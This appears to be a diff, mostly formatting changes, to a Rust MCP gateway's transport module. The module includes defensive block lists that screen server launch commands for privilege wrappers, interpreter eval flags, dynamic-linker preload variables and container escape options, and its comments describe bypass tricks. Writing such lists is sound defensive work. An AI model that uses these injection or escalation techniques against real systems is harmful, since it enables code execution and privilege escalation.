@@ -72,8 +72,20 @@ fn is_http_token(value: &str) -> bool {
             byte.is_ascii_alphanumeric()
                 || matches!(
                     byte,
-                    b'!' | b'#' | b'$' | b'%' | b'&' | b'\'' | b'*' | b'+' | b'-'
-                        | b'.' | b'^' | b'_' | b'`' | b'|' | b'~'
+                    b'!' | b'#'
+                        | b'$'
+                        | b'%'
+                        | b'&'
+                        | b'\''
+                        | b'*'
+                        | b'+'
+                        | b'-'
+                        | b'.'
+                        | b'^'
+                        | b'_'
+                        | b'`'
+                        | b'|'
+                        | b'~'
                 )
         })
 }
@@ -81,9 +93,7 @@ fn is_http_token(value: &str) -> bool {
 /// Encode a modern MCP routing/header value using the SEP-2243 sentinel form.
 #[doc(hidden)]
 pub fn encode_mcp_header_text(value: &str) -> String {
-    let safe_ascii = value
-        .bytes()
-        .all(|byte| matches!(byte, 0x20..=0x7e))
+    let safe_ascii = value.bytes().all(|byte| matches!(byte, 0x20..=0x7e))
         && value.trim() == value
         && !(value.starts_with("=?base64?") && value.ends_with("?="));
     if safe_ascii {
@@ -100,10 +110,7 @@ fn modern_standard_headers(body: &Value) -> Result<Vec<(String, String)>, Transp
     let Some(method) = body.get("method").and_then(Value::as_str) else {
         return Ok(Vec::new());
     };
-    let mut headers = vec![(
-        "Mcp-Method".to_string(),
-        encode_mcp_header_text(method),
-    )];
+    let mut headers = vec![("Mcp-Method".to_string(), encode_mcp_header_text(method))];
     let name = match method {
         "tools/call" | "prompts/get" => body
             .get("params")
@@ -175,7 +182,9 @@ fn collect_header_param_specs(
             ));
         }
         if !names.insert(name.to_ascii_lowercase()) {
-            return Err(format!("x-mcp-header '{name}' is not case-insensitively unique"));
+            return Err(format!(
+                "x-mcp-header '{name}' is not case-insensitively unique"
+            ));
         }
         specs.push(HeaderParamSpec {
             header_name: format!("Mcp-Param-{name}"),
@@ -205,12 +214,7 @@ fn header_param_specs(tool: &Value) -> Result<Vec<HeaderParamSpec>, String> {
         return Ok(Vec::new());
     };
     let mut specs = Vec::new();
-    collect_header_param_specs(
-        schema,
-        &mut Vec::new(),
-        &mut HashSet::new(),
-        &mut specs,
-    )?;
+    collect_header_param_specs(schema, &mut Vec::new(), &mut HashSet::new(), &mut specs)?;
     Ok(specs)
 }
 
@@ -231,7 +235,8 @@ fn filter_modern_http_tools(server_id: &str, tools: Vec<Value>) -> Vec<Value> {
 }
 
 fn value_at_path<'a>(value: &'a Value, path: &[String]) -> Option<&'a Value> {
-    path.iter().try_fold(value, |current, part| current.get(part))
+    path.iter()
+        .try_fold(value, |current, part| current.get(part))
 }
 
 fn encode_header_param(value: &Value) -> Result<Option<String>, TransportError> {
@@ -630,11 +635,7 @@ impl MrtrRequest {
     }
 }
 
-fn with_meta_and_mrtr(
-    params: Value,
-    meta: Option<&Value>,
-    mrtr: Option<&MrtrRequest>,
-) -> Value {
+fn with_meta_and_mrtr(params: Value, meta: Option<&Value>, mrtr: Option<&MrtrRequest>) -> Value {
     let mut params = with_meta(params, meta);
     if let Some(mrtr) = mrtr {
         mrtr.apply(&mut params);
@@ -825,7 +826,6 @@ pub(crate) const HTTP_MAX_RETRIES: u32 = 2;
 pub(crate) const HTTP_RETRY_BASE: Duration = Duration::from_millis(250);
 pub(crate) const HTTP_RETRY_CAP: Duration = Duration::from_secs(10);
 
-
 /// Error from a single transport request attempt. The caller (Router) owns the
 /// retry loop so it can release the per-server Mutex during the backoff sleep,
 /// instead of blocking every other agent queued on the same server.
@@ -900,7 +900,10 @@ impl CancelRegistry {
     }
 
     pub fn begin_client_request(&self, client_request_id: String) -> bool {
-        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+        let mut state = self
+            .inner
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
         if state.active.contains(&client_request_id) {
             return false;
         }
@@ -909,14 +912,20 @@ impl CancelRegistry {
     }
 
     pub fn finish_client_request(&self, client_request_id: &str) {
-        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+        let mut state = self
+            .inner
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
         state.active.remove(client_request_id);
         state.cancelled.remove(client_request_id);
         state.in_flight.remove(client_request_id);
     }
 
     pub fn context(&self, client_request_id: String) -> CancelContext {
-        CancelContext { client_request_id, registry: self.clone() }
+        CancelContext {
+            client_request_id,
+            registry: self.clone(),
+        }
     }
 
     /// Mark an active client request as cancelled and, if it has already reached a
@@ -924,7 +933,10 @@ impl CancelRegistry {
     /// Returns true when the referenced client request is still active.
     pub fn cancel(&self, client_request_id: &str, reason: Option<&str>) -> bool {
         let forward = {
-            let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+            let mut state = self
+                .inner
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner);
             if !state.active.contains(client_request_id) {
                 return false;
             }
@@ -954,7 +966,10 @@ impl CancelRegistry {
 
     fn forward_cancel_if_ready(&self, client_request_id: &str) {
         let forward = {
-            let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+            let mut state = self
+                .inner
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner);
             prepare_cancel_forward(&mut state, client_request_id)
         };
         if let Some((entry, reason)) = forward {
@@ -963,12 +978,18 @@ impl CancelRegistry {
     }
 
     fn register(&self, client_request_id: String, entry: CancelEntry) -> CancelGuard {
-        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+        let mut state = self
+            .inner
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
         state.in_flight.insert(client_request_id.clone(), entry);
         if let Some(cancelled) = state.cancelled.get_mut(&client_request_id) {
             cancelled.forwarded = false;
         }
-        CancelGuard { client_request_id, registry: self.clone() }
+        CancelGuard {
+            client_request_id,
+            registry: self.clone(),
+        }
     }
 }
 
@@ -1012,7 +1033,10 @@ impl CancelEntry {
             "method": "notifications/cancelled",
             "params": Value::Object(params)
         });
-        let mut stdin = self.stdin.lock().map_err(|_| "downstream stdin lock poisoned".to_string())?;
+        let mut stdin = self
+            .stdin
+            .lock()
+            .map_err(|_| "downstream stdin lock poisoned".to_string())?;
         writeln!(stdin, "{msg}").map_err(|e| e.to_string())?;
         stdin.flush().map_err(|e| e.to_string())
     }
@@ -1056,7 +1080,10 @@ impl TransportError {
     /// [`TransportError::Rpc`] is deliberately excluded, same as [`TransportError::Fatal`]:
     /// a server that answers with an error response is alive and well-behaved.
     pub fn is_health_failure(&self) -> bool {
-        matches!(self, TransportError::Unavailable(_) | TransportError::Retry { .. })
+        matches!(
+            self,
+            TransportError::Unavailable(_) | TransportError::Retry { .. }
+        )
     }
 
     /// The JSON-RPC `code`, when the failure was an error *response* from the
@@ -1246,7 +1273,11 @@ pub fn expand_cwd(dir: &str) -> std::path::PathBuf {
     if out == "~" || out.starts_with("~/") || out.starts_with("~\\") {
         if let Some(home) = dirs::home_dir() {
             let rest = out[1..].trim_start_matches(['/', '\\']);
-            return if rest.is_empty() { home } else { home.join(rest) };
+            return if rest.is_empty() {
+                home
+            } else {
+                home.join(rest)
+            };
         }
     }
     std::path::PathBuf::from(out)
@@ -1280,7 +1311,9 @@ fn cwd_validation_error(dir: &str, expanded: &Path, empty_variables: &[String]) 
             .map(|name| format!("${{{name}}}"))
             .collect::<Vec<_>>()
             .join(", ");
-        message.push_str(&format!("; expanded empty environment variables: {variables}"));
+        message.push_str(&format!(
+            "; expanded empty environment variables: {variables}"
+        ));
     }
     message
 }
@@ -1290,7 +1323,11 @@ fn validate_cwd(dir: &str) -> Result<std::path::PathBuf, String> {
     if expanded.is_dir() {
         return Ok(expanded);
     }
-    Err(cwd_validation_error(dir, &expanded, &empty_cwd_variables(dir)))
+    Err(cwd_validation_error(
+        dir,
+        &expanded,
+        &empty_cwd_variables(dir),
+    ))
 }
 
 /// Resolve the reserved `${ROOT}` token in a per-server working directory
@@ -1330,7 +1367,10 @@ pub fn file_uri_to_path(uri: &str) -> Option<String> {
     if parsed.scheme() != "file" {
         return None;
     }
-    parsed.to_file_path().ok().map(|p| p.to_string_lossy().into_owned())
+    parsed
+        .to_file_path()
+        .ok()
+        .map(|p| p.to_string_lossy().into_owned())
 }
 
 /// macOS GUI apps (and apps they launch, like the client-spawned gateway) inherit
@@ -1365,7 +1405,10 @@ pub fn augmented_path() -> &'static str {
         }
         if let Some(home) = dirs::home_dir() {
             for sub in [".local/bin", ".cargo/bin", ".bun/bin"] {
-                push(home.join(sub).to_string_lossy().into_owned(), &mut dirs_list);
+                push(
+                    home.join(sub).to_string_lossy().into_owned(),
+                    &mut dirs_list,
+                );
             }
         }
         for d in ["/usr/local/bin", "/opt/homebrew/bin", "/usr/bin", "/bin"] {
@@ -1424,8 +1467,7 @@ pub enum ServerRequestAction {
 }
 
 /// A bidirectional JSON-RPC channel to one downstream server.
-pub type ServerRequestHandler =
-    Arc<dyn Fn(&Value) -> Option<ServerRequestAction> + Send + Sync>;
+pub type ServerRequestHandler = Arc<dyn Fn(&Value) -> Option<ServerRequestAction> + Send + Sync>;
 
 #[derive(Clone, Debug)]
 struct PendingLegacyMrtr {
@@ -1759,17 +1801,55 @@ fn forward_line(
 /// these outright. (`env` is handled specially below so the common `env VAR=val cmd`
 /// pattern keeps working.) A server that needs a wrapper ships a dedicated launcher.
 const LAUNCHER_WRAPPERS: &[&str] = &[
-    "sudo", "doas", "su", "runuser", "pkexec", "time", "nice", "nohup", "xargs",
-    "stdbuf", "timeout", "setsid", "ionice", "chrt", "taskset", "setarch", "unbuffer",
-    "script", "watch", "flock", "busybox", "proxychains", "proxychains4", "torify",
-    "chroot", "capsh", "firejail", "wine",
+    "sudo",
+    "doas",
+    "su",
+    "runuser",
+    "pkexec",
+    "time",
+    "nice",
+    "nohup",
+    "xargs",
+    "stdbuf",
+    "timeout",
+    "setsid",
+    "ionice",
+    "chrt",
+    "taskset",
+    "setarch",
+    "unbuffer",
+    "script",
+    "watch",
+    "flock",
+    "busybox",
+    "proxychains",
+    "proxychains4",
+    "torify",
+    "chroot",
+    "capsh",
+    "firejail",
+    "wine",
     // Namespace / privilege / sandbox launchers and debuggers/tracers that also run their
     // first bare argument as the real program (`strace node -e <code>`, `nsenter … <cmd>`),
     // so screening only the wrapper name is the same silent bypass as sudo/time. (`qemu-*`
     // user-mode emulators do the same and are matched by prefix in screen_spawn_command.)
-    "nsenter", "unshare", "systemd-run", "setpriv", "gosu", "strace", "ltrace", "gdb",
-    "valgrind", "proot", "bwrap", "catchsegv", "eatmydata", "parallel", "rlwrap",
-    "dbus-run-session", "xvfb-run",
+    "nsenter",
+    "unshare",
+    "systemd-run",
+    "setpriv",
+    "gosu",
+    "strace",
+    "ltrace",
+    "gdb",
+    "valgrind",
+    "proot",
+    "bwrap",
+    "catchsegv",
+    "eatmydata",
+    "parallel",
+    "rlwrap",
+    "dbus-run-session",
+    "xvfb-run",
 ];
 
 pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
@@ -1845,8 +1925,16 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
 /// form node accepts for require (`-r./pwn.js`), which a plain equality check misses.
 fn node_dangerous(args: &[String]) -> Option<&str> {
     const FLAGS: &[&str] = &[
-        "-e", "--eval", "-p", "--print", "-r", "--require", "--import", "--loader",
-        "--experimental-loader", "--preload",
+        "-e",
+        "--eval",
+        "-p",
+        "--print",
+        "-r",
+        "--require",
+        "--import",
+        "--loader",
+        "--experimental-loader",
+        "--preload",
     ];
     args.iter()
         .find(|a| {
@@ -1878,7 +1966,11 @@ fn remote_specifier(arg: &str) -> bool {
 /// the value of a known space-separated value option (`--config x`) so the subcommand and
 /// its executable target aren't mistaken for an option's value. Returns the operand and its
 /// index.
-fn next_operand<'a>(args: &'a [String], from: usize, value_opts: &[&str]) -> (Option<&'a str>, usize) {
+fn next_operand<'a>(
+    args: &'a [String],
+    from: usize,
+    value_opts: &[&str],
+) -> (Option<&'a str>, usize) {
     let mut j = from;
     while let Some(a) = args.get(j) {
         if a.starts_with('-') {
@@ -1901,8 +1993,15 @@ fn next_operand<'a>(args: &'a [String], from: usize, value_opts: &[&str]) -> (Op
 /// application argument (`deno run ./s.ts --url https://api`) is not fetched code.
 fn deno_dangerous(args: &[String]) -> Option<&str> {
     const VALUE_OPTS: &[&str] = &[
-        "--config", "-c", "--import-map", "--lock", "--cert", "--v8-flags", "--seed",
-        "--log-level", "-L",
+        "--config",
+        "-c",
+        "--import-map",
+        "--lock",
+        "--cert",
+        "--v8-flags",
+        "--seed",
+        "--log-level",
+        "-L",
     ];
     let (sub, si) = next_operand(args, 0, VALUE_OPTS);
     let Some(sub) = sub else { return None };
@@ -1953,12 +2052,17 @@ fn bun_dangerous(args: &[String]) -> Option<&str> {
 fn awk_dangerous(args: &[String]) -> Option<&str> {
     let has_file = args.iter().any(|a| {
         let al = a.to_ascii_lowercase();
-        al == "-f" || al == "--file" || al.starts_with("--file=") || (al.starts_with("-f") && al.len() > 2)
+        al == "-f"
+            || al == "--file"
+            || al.starts_with("--file=")
+            || (al.starts_with("-f") && al.len() > 2)
     });
     if has_file {
         return None;
     }
-    args.iter().find(|a| !a.starts_with('-')).map(|a| a.as_str())
+    args.iter()
+        .find(|a| !a.starts_with('-'))
+        .map(|a| a.as_str())
 }
 
 /// Screen `env [VAR=val ...] <cmd> [args]`: peel the leading assignments (screened the
@@ -2002,12 +2106,17 @@ pub fn screen_spawn_env(env: &[(String, String)]) -> Result<(), String> {
     // Always-refuse: dynamic-linker preload/audit + shell startup-file vars that run
     // code before (or instead of) the entry program. These have no benign value.
     const BLOCKED: &[&str] = &[
-        "LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
+        "LD_PRELOAD",
+        "LD_AUDIT",
+        "DYLD_INSERT_LIBRARIES",
+        "BASH_ENV",
+        "ENV",
         // ZDOTDIR relocates zsh's startup dir, so `$ZDOTDIR/.zshenv` runs even for a
         // non-interactive `zsh script` (the zsh analog of the blocked BASH_ENV). GCONV_PATH
         // points iconv/gconv at an attacker-supplied conversion module. Neither has a
         // legitimate use on a server launcher.
-        "ZDOTDIR", "GCONV_PATH",
+        "ZDOTDIR",
+        "GCONV_PATH",
     ];
     // Option vars that are usually benign (tuning) but can inject code via specific
     // options; only those options are refused (whole-var blocking false-positived on
@@ -2015,9 +2124,22 @@ pub fn screen_spawn_env(env: &[(String, String)]) -> Result<(), String> {
     // -r is ruby/node require; -e is omitted for RUBYOPT because it doesn't honor it and
     // would collide with the benign `-E<encoding>` after lowercasing.
     const OPTION_VARS: &[(&str, &[&str])] = &[
-        ("NODE_OPTIONS", &["--require", "--import", "--loader", "--experimental-loader", "--eval", "-r"]),
+        (
+            "NODE_OPTIONS",
+            &[
+                "--require",
+                "--import",
+                "--loader",
+                "--experimental-loader",
+                "--eval",
+                "-r",
+            ],
+        ),
         ("RUBYOPT", &["-r"]),
-        ("JAVA_TOOL_OPTIONS", &["-javaagent", "-agentlib", "-agentpath"]),
+        (
+            "JAVA_TOOL_OPTIONS",
+            &["-javaagent", "-agentlib", "-agentpath"],
+        ),
         ("_JAVA_OPTIONS", &["-javaagent", "-agentlib", "-agentpath"]),
         // PERL5OPT applies to EVERY perl invocation (even `perl script.pl`): -M/-m
         // preload a module (running its code) and -d loads the debugger. Benign tuning
@@ -2086,25 +2208,33 @@ fn pwsh_dangerous(args: &[String]) -> Option<&str> {
                 return false;
             }
             let al = a.to_ascii_lowercase();
-            let name = al.trim_start_matches(['-', '/']).split([':', '=']).next().unwrap_or("");
+            let name = al
+                .trim_start_matches(['-', '/'])
+                .split([':', '='])
+                .next()
+                .unwrap_or("");
             !name.is_empty()
-                && ("command".starts_with(name) || "encodedcommand".starts_with(name) || name == "ec")
+                && ("command".starts_with(name)
+                    || "encodedcommand".starts_with(name)
+                    || name == "ec")
         })
         .map(|a| a.as_str())
 }
 
 fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
-    args.iter().find(|a| {
-        let al = a.to_ascii_lowercase();
-        let head = al.split('=').next().unwrap_or(&al);
-        if flags.contains(&head) {
-            return true;
-        }
-        // Attached short form: `-c<code>` for a single-dash two-char flag like `-c`/`-e`.
-        flags.iter().any(|f| {
-            f.len() == 2 && f.starts_with('-') && al.len() > 2 && al.starts_with(f)
+    args.iter()
+        .find(|a| {
+            let al = a.to_ascii_lowercase();
+            let head = al.split('=').next().unwrap_or(&al);
+            if flags.contains(&head) {
+                return true;
+            }
+            // Attached short form: `-c<code>` for a single-dash two-char flag like `-c`/`-e`.
+            flags
+                .iter()
+                .any(|f| f.len() == 2 && f.starts_with('-') && al.len() > 2 && al.starts_with(f))
         })
-    }).map(|a| a.as_str())
+        .map(|a| a.as_str())
 }
 
 /// Interpreter FAMILY for dispatch: trims a trailing version so `python3.10`, `python3`,
@@ -2125,8 +2255,8 @@ fn interpreter_family(base: &str) -> &str {
 // taking flags are deliberately OMITTED (python -m/-W/-X/-Q, ruby/perl -C/-F/-I/-K, shell
 // -o) so a cluster that hands them the rest of the token isn't read as an eval.
 const SHELL_BOOL: &[char] = &[
-    'a', 'b', 'e', 'f', 'h', 'i', 'k', 'm', 'n', 'p', 'r', 's', 't', 'u', 'v', 'x', 'B',
-    'C', 'E', 'H', 'P', 'T',
+    'a', 'b', 'e', 'f', 'h', 'i', 'k', 'm', 'n', 'p', 'r', 's', 't', 'u', 'v', 'x', 'B', 'C', 'E',
+    'H', 'P', 'T',
 ];
 const PYTHON_BOOL: &[char] = &[
     'B', 'E', 'I', 'O', 'R', 'S', 'b', 'd', 'h', 'i', 'q', 's', 'u', 'v', 'x', '3',
@@ -2183,7 +2313,10 @@ fn container_escape_flag(args: &[String]) -> Option<&str> {
         if matches!(head, "--privileged" | "--cap-add" | "--device") {
             return Some(a.as_str());
         }
-        if matches!(head, "--pid" | "--ipc" | "--uts" | "--net" | "--network" | "--userns") {
+        if matches!(
+            head,
+            "--pid" | "--ipc" | "--uts" | "--net" | "--network" | "--userns"
+        ) {
             let val = al
                 .split_once('=')
                 .map(|(_, v)| v.to_string())
@@ -2322,8 +2455,7 @@ impl WindowsJob {
         use std::mem::size_of;
         use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
         use windows_sys::Win32::System::Diagnostics::ToolHelp::{
-            CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
-            TH32CS_SNAPTHREAD,
+            CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
         };
         use windows_sys::Win32::System::Threading::{
             OpenThread, ResumeThread, THREAD_SUSPEND_RESUME,
@@ -2358,8 +2490,8 @@ impl WindowsJob {
                     }
 
                     let resume_result = ResumeThread(thread);
-                    let resume_error = (resume_result == u32::MAX)
-                        .then(std::io::Error::last_os_error);
+                    let resume_error =
+                        (resume_result == u32::MAX).then(std::io::Error::last_os_error);
                     let _ = CloseHandle(thread);
                     let _ = CloseHandle(snapshot);
                     if let Some(error) = resume_error {
@@ -2493,8 +2625,7 @@ fn apply_process_group_isolation(cmd: &mut Command) {
 fn strip_gateway_control_env(cmd: &mut Command, configured: &std::collections::HashSet<&str>) {
     for (key, _) in std::env::vars_os() {
         let Some(k) = key.to_str() else { continue };
-        let is_control =
-            k.starts_with("TOOLPORT_") || k.starts_with("CONDUIT_");
+        let is_control = k.starts_with("TOOLPORT_") || k.starts_with("CONDUIT_");
         if is_control && !configured.contains(k) {
             cmd.env_remove(&key);
         }
@@ -2834,7 +2965,9 @@ impl Transport for StdioTransport {
             };
             writeln!(stdin, "{outbound}")
                 .map_err(|e| TransportError::Unavailable(e.to_string()))?;
-            stdin.flush().map_err(|e| TransportError::Unavailable(e.to_string()))?;
+            stdin
+                .flush()
+                .map_err(|e| TransportError::Unavailable(e.to_string()))?;
         }
         if let Some((registry, client_request_id)) = cancel_after_write {
             if registry.is_cancelled(&client_request_id) {
@@ -2889,9 +3022,7 @@ impl Transport for StdioTransport {
                     match handler(&value) {
                         Some(ServerRequestAction::Respond(response)) => {
                             let mut stdin = self.stdin.lock().map_err(|_| {
-                                TransportError::Unavailable(
-                                    "downstream stdin lock poisoned".into(),
-                                )
+                                TransportError::Unavailable("downstream stdin lock poisoned".into())
                             })?;
                             writeln!(stdin, "{response}")
                                 .map_err(|e| TransportError::Unavailable(e.to_string()))?;
@@ -2937,7 +3068,9 @@ impl Transport for StdioTransport {
             .lock()
             .map_err(|_| TransportError::Fatal("downstream stdin lock poisoned".into()))?;
         writeln!(stdin, "{msg}").map_err(|e| TransportError::Fatal(e.to_string()))?;
-        stdin.flush().map_err(|e| TransportError::Fatal(e.to_string()))
+        stdin
+            .flush()
+            .map_err(|e| TransportError::Fatal(e.to_string()))
     }
 
     fn set_read_timeout(&mut self, timeout: Duration) {
@@ -3090,7 +3223,9 @@ pub type RefreshFn = Box<dyn Fn(bool) -> Result<Option<String>, String> + Send +
 /// obtains user consent for the challenged scope and returns a new access token.
 pub type ScopeReauthorizeFn = Box<dyn Fn(&str) -> Result<String, String> + Send + Sync>;
 
-fn insufficient_scope_challenge(response: &ureq::Response) -> Option<crate::oauth::BearerChallenge> {
+fn insufficient_scope_challenge(
+    response: &ureq::Response,
+) -> Option<crate::oauth::BearerChallenge> {
     let values = response.all("www-authenticate");
     let challenge = crate::oauth::bearer_challenge(values.iter().copied())?;
     challenge
@@ -3404,9 +3539,8 @@ impl HttpTransport {
                 &pending.common.base_params,
                 pending.bytes_read,
             )?;
-            let resp = resp.ok_or_else(|| {
-                TransportError::Fatal("empty resumed SSE response".to_string())
-            })?;
+            let resp = resp
+                .ok_or_else(|| TransportError::Fatal("empty resumed SSE response".to_string()))?;
             if let Some(err) = resp.get("error") {
                 return Err(TransportError::Rpc(err.clone()));
             }
@@ -3582,9 +3716,7 @@ impl HttpTransport {
                     refreshed = true;
                 }
                 Err(ureq::Error::Status(code, resp))
-                    if (code == 401 || code == 403)
-                        && !refreshed
-                        && self.refresh.is_some() =>
+                    if (code == 401 || code == 403) && !refreshed && self.refresh.is_some() =>
                 {
                     let _ = read_capped(resp, 8 * 1024);
                     refreshed = true;
@@ -3678,8 +3810,7 @@ impl HttpTransport {
                         continue;
                     }
                     Some(ServerRequestAction::InputRequired) => {
-                        let common =
-                            PendingLegacyMrtr::new(v, wanted.clone(), method, params)?;
+                        let common = PendingLegacyMrtr::new(v, wanted.clone(), method, params)?;
                         let result = common.input_required();
                         self.pending_mrtr = Some(PendingHttpMrtr {
                             common,
@@ -3704,7 +3835,11 @@ impl HttpTransport {
         ))
     }
 
-    fn post(&mut self, body: &Value, expect_response: bool) -> Result<Option<Value>, TransportError> {
+    fn post(
+        &mut self,
+        body: &Value,
+        expect_response: bool,
+    ) -> Result<Option<Value>, TransportError> {
         self.post_with_headers(body, expect_response, &[])
     }
 
@@ -3811,7 +3946,9 @@ impl HttpTransport {
                     } else {
                         ""
                     };
-                    return Err(TransportError::Fatal(format!("HTTP {code}{hint}: {detail}")));
+                    return Err(TransportError::Fatal(format!(
+                        "HTTP {code}{hint}: {detail}"
+                    )));
                 }
                 // Transport error (DNS / connection failure): retryable, but
                 // the Router owns the backoff sleep so the Mutex is released.
@@ -3980,8 +4117,7 @@ impl Transport for HttpTransport {
                                 );
                                 break None;
                             };
-                            let attempt_key =
-                                ("subscriptions/listen".to_string(), scope.clone());
+                            let attempt_key = ("subscriptions/listen".to_string(), scope.clone());
                             let first_attempt = scope_upgrade_attempts
                                 .lock()
                                 .map(|mut attempts| attempts.insert(attempt_key))
@@ -4051,9 +4187,9 @@ impl Transport for HttpTransport {
                     retry_delay = (retry_delay * 2).min(Duration::from_secs(5));
                     continue;
                 };
-                let is_sse = response.header("content-type").is_some_and(|value| {
-                    value.to_ascii_lowercase().contains("text/event-stream")
-                });
+                let is_sse = response
+                    .header("content-type")
+                    .is_some_and(|value| value.to_ascii_lowercase().contains("text/event-stream"));
                 if !is_sse {
                     let detail: String =
                         read_capped(response, 64 * 1024).chars().take(200).collect();
@@ -4072,10 +4208,7 @@ impl Transport for HttpTransport {
                         return;
                     }
                     let mut line = String::new();
-                    let read = match (&mut reader)
-                        .take(MAX_RESPONSE_BYTES)
-                        .read_line(&mut line)
-                    {
+                    let read = match (&mut reader).take(MAX_RESPONSE_BYTES).read_line(&mut line) {
                         Ok(read) => read,
                         Err(error) => {
                             downstream_trace(&format!(
@@ -4290,7 +4423,10 @@ impl DownstreamServer {
                         // Today Toolport speaks exactly one modern revision, so
                         // this is usually a clean incompatibility, but the ladder
                         // is written to negotiate rather than to assume.
-                        match offered.iter().find(|v| v.as_str() == MODERN_PROTOCOL_VERSION) {
+                        match offered
+                            .iter()
+                            .find(|v| v.as_str() == MODERN_PROTOCOL_VERSION)
+                        {
                             Some(version) => {
                                 // Re-stamp before retrying so header and body agree
                                 // on the newly chosen version too.
@@ -4420,7 +4556,8 @@ impl DownstreamServer {
     /// transport. The transport consumes real legacy server-initiated requests;
     /// the wrapper consumes modern `input_required` results for legacy clients.
     pub fn set_server_request_handler(&mut self, handler: ServerRequestHandler) {
-        self.transport.set_server_request_handler(Arc::clone(&handler));
+        self.transport
+            .set_server_request_handler(Arc::clone(&handler));
         self.server_handler = Some(handler);
     }
 
@@ -4454,19 +4591,13 @@ impl DownstreamServer {
         if let Some(requests) = requests {
             let handler = self.server_handler.as_ref().ok_or_else(|| {
                 TransportError::Fatal(
-                    "upstream client cannot fulfill the server's input_required result"
-                        .to_string(),
+                    "upstream client cannot fulfill the server's input_required result".to_string(),
                 )
             })?;
             for (key, input) in requests {
-                let method = input
-                    .get("method")
-                    .and_then(Value::as_str)
-                    .ok_or_else(|| {
-                        TransportError::Fatal(format!(
-                            "input request '{key}' is missing a method"
-                        ))
-                    })?;
+                let method = input.get("method").and_then(Value::as_str).ok_or_else(|| {
+                    TransportError::Fatal(format!("input request '{key}' is missing a method"))
+                })?;
                 if !matches!(
                     method,
                     "roots/list" | "sampling/createMessage" | "elicitation/create"
@@ -4489,8 +4620,7 @@ impl DownstreamServer {
                     Some(ServerRequestAction::Respond(response)) => response,
                     Some(ServerRequestAction::InputRequired) => {
                         return Err(TransportError::Fatal(
-                            "cannot nest an input_required bridge while fulfilling one"
-                                .to_string(),
+                            "cannot nest an input_required bridge while fulfilling one".to_string(),
                         ))
                     }
                     None => {
@@ -4582,10 +4712,11 @@ impl DownstreamServer {
         };
         if let Some(version) = modern_version.as_deref() {
             let capabilities = json!({ "extensions": self.caps_extensions.clone() });
-            self.transport.set_protocol_meta(Some(protocol_meta_for_catalog(
-                version,
-                Some(&capabilities),
-            )));
+            self.transport
+                .set_protocol_meta(Some(protocol_meta_for_catalog(
+                    version,
+                    Some(&capabilities),
+                )));
         }
         let listed = fetch_paginated_list(&mut *self.transport, "tools/list", "tools");
         if let Some(version) = modern_version.as_deref() {
@@ -4898,19 +5029,23 @@ impl DownstreamServer {
                 let mut resource_subscriptions: Vec<String> =
                     self.modern_resource_subscriptions.iter().cloned().collect();
                 resource_subscriptions.sort();
-                if let Err(error) = self.transport.set_subscription_listener(SubscriptionFilter {
-                    tools_list_changed: true,
-                    prompts_list_changed: self.caps_prompts,
-                    resources_list_changed: self.caps_resources,
-                    resource_subscriptions,
-                }) {
+                if let Err(error) = self
+                    .transport
+                    .set_subscription_listener(SubscriptionFilter {
+                        tools_list_changed: true,
+                        prompts_list_changed: self.caps_prompts,
+                        resources_list_changed: self.caps_resources,
+                        resource_subscriptions,
+                    })
+                {
                     self.modern_resource_subscriptions.remove(uri);
                     return Err(error);
                 }
             }
             return Ok(json!({}));
         }
-        self.transport.request("resources/subscribe", json!({ "uri": uri }))
+        self.transport
+            .request("resources/subscribe", json!({ "uri": uri }))
     }
 
     /// Drop a previously established downstream resource subscription.
@@ -4920,12 +5055,15 @@ impl DownstreamServer {
                 let mut resource_subscriptions: Vec<String> =
                     self.modern_resource_subscriptions.iter().cloned().collect();
                 resource_subscriptions.sort();
-                if let Err(error) = self.transport.set_subscription_listener(SubscriptionFilter {
-                    tools_list_changed: true,
-                    prompts_list_changed: self.caps_prompts,
-                    resources_list_changed: self.caps_resources,
-                    resource_subscriptions,
-                }) {
+                if let Err(error) = self
+                    .transport
+                    .set_subscription_listener(SubscriptionFilter {
+                        tools_list_changed: true,
+                        prompts_list_changed: self.caps_prompts,
+                        resources_list_changed: self.caps_resources,
+                        resource_subscriptions,
+                    })
+                {
                     self.modern_resource_subscriptions.insert(uri.to_string());
                     return Err(error);
                 }
@@ -5006,7 +5144,10 @@ impl DownstreamServer {
         cancel: Option<CancelContext>,
         meta: Option<&Value>,
     ) -> Result<Value, TransportError> {
-        if !self.caps_extensions.contains_key("io.modelcontextprotocol/tasks") {
+        if !self
+            .caps_extensions
+            .contains_key("io.modelcontextprotocol/tasks")
+        {
             return Err(TransportError::Fatal(format!(
                 "server '{}' did not advertise io.modelcontextprotocol/tasks",
                 self.id
@@ -5120,7 +5261,9 @@ fn fetch_paginated_list(
             return Ok(PaginatedList {
                 items,
                 cache_hint: CacheHint::default(),
-                warning: Some(format!("catalog exceeded the {MAX_LIST_ITEMS}-item safety cap")),
+                warning: Some(format!(
+                    "catalog exceeded the {MAX_LIST_ITEMS}-item safety cap"
+                )),
             });
         }
         items.extend(page);
@@ -5149,18 +5292,20 @@ fn fetch_paginated_list(
     Ok(PaginatedList {
         items,
         cache_hint: CacheHint::default(),
-        warning: Some(format!("catalog exceeded the {MAX_LIST_PAGES}-page safety cap")),
+        warning: Some(format!(
+            "catalog exceeded the {MAX_LIST_PAGES}-page safety cap"
+        )),
     })
 }
 
 #[cfg(test)]
 mod tests {
     use super::{
